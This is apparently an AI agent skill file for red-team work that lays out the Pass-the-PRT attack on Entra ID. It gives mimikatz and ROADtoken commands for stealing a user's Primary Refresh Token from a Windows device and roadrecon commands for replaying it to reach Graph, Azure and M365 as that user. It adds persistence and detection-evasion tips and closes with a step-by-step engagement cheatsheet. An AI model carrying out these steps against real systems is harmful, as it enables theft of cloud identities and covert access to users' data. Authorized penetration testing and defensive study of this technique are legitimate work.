---
name: offensive-pass-the-prt
description: "Pass-the-PRT attack methodology — Primary Refresh Token theft from a logged-on Windows device, replaying it for cloud session as that user, mimikatz / ROADtoken extraction, and persistence via long-lived PRT use. Use when you have local admin / SYSTEM on a Windows device joined to Entra ID — the PRT yields the user's full cloud session."
---

# Pass-the-PRT

The Primary Refresh Token (PRT) is Entra ID's session token for a Windows device. Stealing it grants attacker the user's cloud session for the PRT's lifetime (typically 14 days).

## Where PRT Lives

- LSASS process on the user's device (Entra-joined or hybrid-joined)
- Protected by TPM if device has one configured
- Encrypted with device-bound keys

## Extraction

### Mimikatz (with admin / SYSTEM)

```powershell
mimikatz.exe
> privilege::debug
> sekurlsa::cloudap
# Output: PRT, ProofOfPossessionKey, etc.
```

### ROADtoken

```powershell
# ROADtoken for user-context PRT extraction (no admin needed in some configs)
ROADtoken.exe
# Outputs PRT cookie value usable for browser session
```

### Browser Session Cookie

PRT-aware browsers (Edge, Chrome with PRT extension) store related cookies. Browser-cookie theft (DPAPI) yields PRT-derived session.

## Use the PRT

```bash
# Inject into a browser as a cookie / via ROADtools
roadrecon auth --prt-cookie <prt-cookie> --derived-key <key>

# Now you have access tokens as the user; use Graph / Azure / M365 as them
```

## Detection

| Signal | Defender View |
|---|---|
| Sign-in from unfamiliar IP | Identity Protection (Risky Sign-In) |
| Token use without corresponding device sign-in event | Conditional Access logs |
| Mimikatz process pattern | EDR static signature |

If the user is in a known location and you operate from a similar IP, PRT use blends well.

## Persistence

PRT default lifetime is ~14 days. Conditional Access policies can require re-auth on certain conditions, but absent strict CA, the PRT continues working.

## TPM Considerations

When TPM-bound, the PRT's proof-of-possession key is in TPM. You can use the PRT only on the device unless you also exfil the TPM key — much harder.

ROADtoken handles TPM-bound PRT extraction in some configurations (varies by Windows version).

## Engagement Cheatsheet

```powershell
# 1. Local admin or SYSTEM on Entra-joined device
mimikatz.exe
> sekurlsa::cloudap

# 2. Or user-context with ROADtoken
ROADtoken.exe

# 3. Inject for cloud session
roadrecon auth --prt-cookie <value>

# 4. Graph / Azure / M365 as user
roadrecon gui

# 5. Document: source device, PRT lifetime, persistence achieved
```

## Key References

- Mimikatz cloudap module
- ROADtoken: github.com/dirkjanm/ROADtoken
- "Pass-the-PRT" research (Dirk-jan Mollema, Lee Christensen)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/pass-the-prt.md
